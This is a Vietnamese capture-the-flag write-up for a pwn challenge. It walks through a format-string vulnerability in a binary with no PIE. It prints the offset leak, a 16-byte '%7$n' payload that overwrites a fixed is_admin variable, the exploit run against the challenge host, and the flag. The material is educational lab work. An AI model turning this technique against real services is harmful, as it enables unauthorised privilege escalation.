# Manifest Destiny — Pwn (Medium)

**Flag:** `H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}`

## Đề bài

Terminal của Sparrow Freight giữ bảng hàng hoá dưới quyền admin. Ta chỉ là khách vãng lai,
nhưng terminal "thích feedback và để tâm từng lời bạn nói". Mục tiêu: nâng quyền lên
"management" và đọc manifest.

## Phân tích ban đầu

`manifest.zip` cho binary + đúng `libc.so.6` (glibc 2.39, Ubuntu 24.04) + loader.
Triage bằng `scripts/triage.cjs`:

```
ELF 64-bit, type=ET_EXEC (no PIE), interpreter=/lib64/ld-linux-x86-64.so.2
PIE=no  RELRO=yes  STACK=non-exec (NX on)
keyword: admin
```

Không PIE là chi tiết quan trọng nhất: biến quyền nằm ở địa chỉ cố định, nên format string
chỉ cần một phép ghi là đủ - không cần leak, không cần ROP.

Phân rã ba hàm chính:

```
main:      fgets(16) -> atoi;  1 -> feedback(), 2 -> view_manifest(), còn lại -> return
feedback:  char buf[] at rbp-0xd0; memset; read(0, buf, 0xc7);
           printf("You said: ");  printf(buf);      <-- lỗi ở đây
view_manifest:
           if (!is_admin) puts("[!] admin clearance required.");
           else fopen(flag_file,"r"); fgets(128); printf("[manifest] clearance code: %s", buf);
```

`is_admin` là `DWORD` tại `0x40407c` (`.bss`).

Điểm mấu chốt về layout: `feedback` làm `push rbp; mov rbp,rsp; sub rsp,0xd0`, tức buffer nằm
chính xác tại `rsp`. Khi `call printf` được thực hiện, 6 tham số đầu đi qua thanh ghi
(rdi là format string, còn rsi/rdx/rcx/r8/r9 là vararg 1-5), và vararg thứ 6 trở đi lấy từ stack
ngay trên return address - tức đúng `buf+0`. Suy ra:

- `buf+0` là đối số thứ 6 (`%6$`)
- `buf+8` là đối số thứ 7 (`%7$`)

## Các hướng đã loại

1. Cần leak libc / làm ROP. Không: không có shell nào được gọi tới, và `view_manifest` chỉ
   cần một biến khác 0. Bỏ hướng này sau khi thấy `is_admin` nằm ở địa chỉ cố định.
2. Overflow tuyến tính từ buf 208 byte. `read` giới hạn 0xc7 = 199 < 208 nên không tràn
   xuống saved rbp/return address. Lỗi duy nhất là format string.
3. Port cũ của instance (`41903`). Kết nối được nhưng server không trả gì (0 byte) -
   đó là phiên đã chết, không phải binary lỗi; đề có ghi "service có thể cần vài giây để khởi động".
   Chuyển sang port mới `42506` thì đúng luồng.

## Chuỗi khai thác

**Bước 1 - Xác nhận vị trí buffer bằng leak.** Gửi `MARKER-%6$p-%7$p-...`:

```
You said: MARKER-0x252d52454b52414d-0x702437252d702436-...
```

`0x252d52454b52414d` chính là 8 byte `"MARKER-%"` đọc ngược (little-endian) -> buf+0 == đối số 6,
đúng như suy luận từ disassembly. Bước này rẻ và loại mọi đoán mò về offset.

**Bước 2 - Đặt địa chỉ vào buf+8 và ghi bằng `%7$n`.**

Payload 16 byte:

```
"CCCC"  +  "%7$n"  +  p64(0x40407c)
 0..3       4..7        8..15
```

**Bước 3 - Bẫy đã gặp: `%n` ghi số 0.** Thử đầu tiên để `%7$n` ở ngay đầu buffer
(`"%7$n" + b"AA" + addr`) - chạy không crash, nhưng `is_admin` vẫn 0, manifest từ chối.
Lý do kép:

- `%n` ghi số ký tự đã in tính tới thời điểm đó; nếu `%n` đứng đầu thì con số là 0.
- đồng thời 2 byte padding khiến địa chỉ nằm ở offset 6 chứ không phải 8, lệch khỏi `buf+8`.

Sửa bằng cách đảo thứ tự: 4 ký tự in được đặt trước (`CCCC`), `%7$n` ở offset 4-7,
địa chỉ rơi đúng buf+8. Khi đó `%n` ghi giá trị 4 - khác 0 là đủ qua `test eax,eax`.

**Bước 4 - Đọc manifest.** Chọn `2`:

```
[manifest] clearance code: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
```

## Flag
```bash
python exploit.py pwn.h7tex.com 42506
```

```
[*] prompt: Leave feedback for the terminal operators:
[*] echo: b'You said: CCCC|@@\n\n1) leave feedback\n...'
[*] manifest: [manifest] clearance code: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
[+] FLAG: H7CTF{a2b24085-c670-4a87-93cb-293cfec6196c}
```
